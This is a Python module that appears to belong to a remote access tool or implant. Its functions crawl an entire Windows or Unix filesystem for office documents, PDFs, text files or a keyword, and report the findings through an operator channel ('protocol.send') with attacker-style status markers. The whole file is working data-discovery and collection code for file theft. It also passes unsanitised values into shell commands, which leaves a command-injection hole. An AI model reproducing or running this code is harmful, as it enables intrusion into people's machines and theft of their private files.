import os
import subprocess


def search_files(protocol, pattern='*.docx;*.xlsx;*.pdf;*.txt', root_path=None):
    if root_path is None:
        root_path = 'C:\\' if os.name == 'nt' else '/'
    exts = [p.strip().replace('*', '') for p in pattern.split(';')]
    try:
        if os.name == 'nt':
            results = []
            for ext in exts:
                r = subprocess.run(
                    f'dir /s /b "{root_path}\\*{ext}" 2>nul',
                    shell=True, capture_output=True, text=True, timeout=60
                )
                results.extend(r.stdout.strip().split('\n'))
        else:
            conditions = ' '.join(f'-iname "*{e}" -o' for e in exts)
            r = subprocess.run(
                f'find {root_path} -type f \\( {conditions.rstrip("-o")} \\) 2>/dev/null',
                shell=True, capture_output=True, timeout=60
            )
            results = r.stdout.decode('utf-8', errors='replace').strip().split('\n')
        results = [line for line in results if line]
        if results:
            protocol.send(f'[+] Found {len(results)} files:\n' + '\n'.join(results[:200]))
        else:
            protocol.send('[*] No matching files found')
    except Exception as e:
        protocol.send(f'[-] Search error: {str(e)}')


def collect_files(protocol, patterns, max_size_mb=100, max_files=50):
    exts = [p.strip().replace('*', '') for p in patterns.split(';')]
    collected = []
    total_size = 0
    root = 'C:\\' if os.name == 'nt' else '/'
    try:
        for root_dir, dirs, files in os.walk(root):
            dirs[:] = [d for d in dirs if not d.startswith('.') and d not in ('proc', 'sys', 'dev')]
            for f in files:
                if len(collected) >= max_files or total_size >= max_size_mb * 1024 * 1024:
                    break
                if any(f.endswith(ext) for ext in exts):
                    fpath = os.path.join(root_dir, f)
                    try:
                        fsize = os.path.getsize(fpath)
                        total_size += fsize
                        collected.append((fpath, fsize))
                    except OSError:
                        pass
            if len(collected) >= max_files or total_size >= max_size_mb * 1024 * 1024:
                break
        out = [f'[+] Collected {len(collected)} files ({total_size / 1024 / 1024:.1f} MB):']
        for path, size in sorted(collected, key=lambda x: x[1], reverse=True):
            out.append(f'  {size / 1024:7.1f} KB  {path}')
        protocol.send('\n'.join(out))
    except Exception as e:
        protocol.send(f'[-] Collection error: {str(e)}')


def search_content(protocol, keyword, root_path=None):
    if root_path is None:
        root_path = 'C:\\' if os.name == 'nt' else '/'
    try:
        if os.name == 'nt':
            r = subprocess.run(
                f'findstr /s /i /m /c:"{keyword}" "{root_path}\\*.*" 2>nul',
                shell=True, capture_output=True, text=True, timeout=60
            )
        else:
            r = subprocess.run(
                f'grep -rlI -- "{keyword}" {root_path} 2>/dev/null',
                shell=True, capture_output=True, text=True, timeout=60
            )
        out = r.stdout.strip()
        if out:
            lines = out.split('\n')[:50]
            protocol.send(f'[+] Found in {len(lines)} files:\n' + '\n'.join(f'  {ln}' for ln in lines))
        else:
            protocol.send('[*] No matches found')
    except Exception as e:
        protocol.send(f'[-] Content search error: {str(e)}')
